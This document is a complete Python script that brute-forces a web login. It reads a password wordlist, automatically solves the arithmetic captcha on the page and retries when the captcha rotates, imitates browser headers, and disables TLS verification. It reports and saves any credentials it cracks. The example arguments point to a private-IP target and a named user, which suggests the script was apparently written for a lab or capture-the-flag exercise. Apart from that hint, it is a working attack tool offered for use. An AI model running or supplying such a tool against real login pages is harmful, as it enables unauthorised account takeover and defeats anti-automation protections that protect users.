#!/usr/bin/env python3

import requests
import re
import sys
import argparse
import html
from bs4 import BeautifulSoup
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def solve_captcha(captcha_text: str) -> str | None:
    """Parse and solve a simple arithmetic captcha. Supports +, -, *, /"""
    match = re.search(r'(-?\d+)\s*([\+\-\*\/x×÷])\s*(-?\d+)\s*=', captcha_text)
    if not match:
        return None

    a = int(match.group(1))
    op = match.group(2)
    b = int(match.group(3))

    if op == '+':
        result = a + b
    elif op == '-':
        result = a - b
    elif op in ('*', 'x', '×'):
        result = a * b
    elif op in ('/', '÷'):
        if b == 0:
            return None
        result = a // b
    else:
        return None

    return str(result)


def extract_captcha(html_text: str) -> str | None:
    """Extract arithmetic captcha expression from HTML."""
    soup = BeautifulSoup(html_text, 'html.parser')
    text = soup.get_text(separator=' ')
    match = re.search(r'(-?\d+\s*[\+\-\*\/x×÷]\s*-?\d+\s*=\s*\?)', text)
    if match:
        return match.group(1)
    return None


def attempt(session: requests.Session, url: str, username: str, password: str) -> str | None:
    """
    GET the login page, solve any captcha, POST credentials.
    Retries once if the captcha rotates between GET and POST.
    Returns response text or None on network error.
    """
    base_origin = url.rsplit('/', 1)[0] if '/' in url.replace('://', '') else url

    try:
        get_resp = session.get(url, timeout=10, verify=False)

        captcha_answer = None
        if 'captcha' in get_resp.text.lower():
            expr = extract_captcha(get_resp.text)
            if expr:
                captcha_answer = solve_captcha(expr)

        payload = {'username': username, 'password': password}
        if captcha_answer is not None:
            payload['captcha'] = captcha_answer

        post_headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': base_origin,
            'Referer': url,
        }

        resp = session.post(url, data=payload, headers=post_headers,
                            timeout=10, verify=False, allow_redirects=True)

        # Captcha may rotate between GET and POST — retry once with fresh answer
        if 'invalid captcha' in resp.text.lower():
            expr = extract_captcha(resp.text)
            if expr:
                payload['captcha'] = solve_captcha(expr)
                resp = session.post(url, data=payload, headers=post_headers,
                                    timeout=10, verify=False, allow_redirects=True)

        return resp.text

    except requests.RequestException as e:
        print(f"\n[!] Request error: {e}")
        return None


def bruteforce(url: str, username: str, passlist_path: str) -> str | None:
    """
    Try every password for the given username.
    Returns the correct password if found, otherwise None.
    """
    try:
        with open(passlist_path, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [l.strip() for l in f if l.strip()]
    except FileNotFoundError:
        print(f"[!] Wordlist not found: {passlist_path}")
        sys.exit(1)

    print(f"[*] Target   : {url}")
    print(f"[*] Username : {username}")
    print(f"[*] Wordlist : {passlist_path} ({len(passwords)} entries)")
    print("-" * 60)

    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,'
                  'image/avif,image/webp,image/apng,*/*;q=0.8,'
                  'application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'max-age=0',
    })

    total = len(passwords)
    not_found_phrase = f"The user '{username}' does not exist"

    for idx, password in enumerate(passwords, start=1):
        print(f"\r[*] Tried: {idx}/{total}", end='', flush=True)

        resp_text = attempt(session, url, username, password)
        if resp_text is None:
            continue

        unescaped = html.unescape(resp_text)

        # Safety check — stop if the server says the user doesn't exist
        if not_found_phrase in unescaped:
            print(f"\n[!] Server says '{username}' does not exist. Aborting.")
            break

        # Success — login form is no longer in the response
        if 'name="password"' not in resp_text.lower():
            print(f"\n[+] Password found: {password}")
            print(f"[+] Credentials   : {username} : {password}")
            return password

    print(f"\n{'─' * 60}")
    print("[*] Password not found.")
    return None


def main():
    parser = argparse.ArgumentParser(
        description="Password brute force with arithmetic captcha solver."
    )
    parser.add_argument('url',
        help="Target login URL (e.g. http://10.49.173.171/login)")
    parser.add_argument('username',
        help="Username to brute force (e.g. natalie)")
    parser.add_argument('wordlist',
        help="Path to password wordlist (one per line)")
    parser.add_argument('-o', '--output',
        help="Save found credentials to this file")

    args = parser.parse_args()

    password = bruteforce(
        url=args.url,
        username=args.username,
        passlist_path=args.wordlist,
    )

    if args.output and password:
        with open(args.output, 'w') as f:
            f.write(f"{args.username}:{password}\n")
        print(f"[*] Saved to: {args.output}")


if __name__ == '__main__':
    main()